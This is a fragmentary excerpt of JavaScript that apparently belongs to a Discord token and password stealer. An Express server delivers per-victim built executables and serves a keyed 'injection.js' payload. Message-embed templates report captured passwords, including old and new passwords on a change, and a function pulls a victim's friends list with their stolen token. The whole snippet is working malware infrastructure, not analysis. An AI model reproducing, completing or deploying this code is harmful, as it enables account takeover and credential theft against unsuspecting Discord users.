...
app.route('/:id').get(async (req, res) => {
    const { id } = req.params;
    if (fs.existsSync(`./Build/dist/${id}/llx404_${id}.exe`)) {
        res.download(`./Build/dist/${id}/llx404_${id}.exe`)
    }
});

app.get("/injection/:key", async (req, res) => {
    const key = req.params.key;
    const c = fs.readFileSync(`./injection.js`, "utf-8", function (e, t) { });
    return res.send(c.replace("%key%", key));
});
    ...
    var params = {
        embeds: [{
            "fields": [
                ...
                {
                    name: `<:bby:987689933844127804> Password:`,
                    value: `\`${password}\``,
                    inline: true
                },
            ],
    ...
    var params = {
        embeds: [{
            "fields": [
                ...
                {
                    name: `<:bby:987689933844127804> Old Password:`,
                    value: `\`${oldPassword}\``,
                    inline: true
                },
                {
                    name: `<:bby:987689933844127804> New Password:`,
                    value: `\`${newPassword}\``,
                    inline: true
                }
            ],
...
async function getRelationships(token) {
    ...
    var json = j.data;
    const r = json.filter((user) => { return user.type == 1 });
    var gay = '';
    for (z of r) {
